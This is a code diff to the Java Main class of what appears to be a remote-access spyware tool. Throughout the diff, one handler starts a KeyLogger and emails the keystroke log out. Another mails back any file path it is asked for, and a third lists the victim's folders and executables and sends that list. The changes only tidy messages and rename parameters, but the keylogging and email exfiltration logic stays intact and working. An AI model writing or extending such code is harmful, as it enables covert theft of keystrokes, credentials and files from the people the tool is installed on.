@@ -26,7 +26,7 @@ public class Main {
                 .ofPattern(" dd-MM-yyyy HH-mm")) + ".txt";
         try {
             KeyLogger.getInstance().startLog(filename,timer);
-            String subject = "res / " ;
+            String subject = "res/" ;
             SendMail.getInstance().Send(subject,"", filename);
             return 1;
         } catch (IOException e) {
@@ -64,26 +64,17 @@ public class Main {
             return 0;
         }
     }
-    public static int getFile( String header) {
+    public static int getFile( String path) {
         try {
-            Pattern pattern;
-            pattern = Pattern.compile("\"(.*)\"");
-            Matcher matcher;
-            matcher = pattern.matcher(header);
-            String filename = "log.txt";
-            if (matcher.find()) {
-                filename = matcher.group(1);
-                System.out.println(filename);
-            }
-            Path file;
-            file = Path.of(filename);
+            Path file = Path.of(path);
+
             if (!Files.exists(file)) {
-                SendMail.getInstance().Send("res/File doesnt exists, try list Dir!",null,"");
+                SendMail.getInstance().Send("res/File doesn't exist, try listing the directory!", null, "");
             } else {
-                if (Files.isRegularFile(file))
-                    SendMail.getInstance().Send("res/", null, filename);
-                else {
-                    SendMail.getInstance().Send("res/You are request for a directory type",null,"");
+                if (Files.isRegularFile(file)) {
+                    SendMail.getInstance().Send("res/", null, path);
+                } else {
+                    SendMail.getInstance().Send("res/You requested a directory type", null, "");
                 }
             }
             return 1;
@@ -97,7 +88,7 @@ public class Main {
         String subject = "res/";
         try{
             String filename = "ListApp.txt";
-            ListApp.getInstance().list(filename);
+            ListApp.getInstance().listFoldersAndExes(filename);
             SendMail.getInstance().Send(subject,"",filename);
             return 1;
         }catch(IOException | MessagingException e){
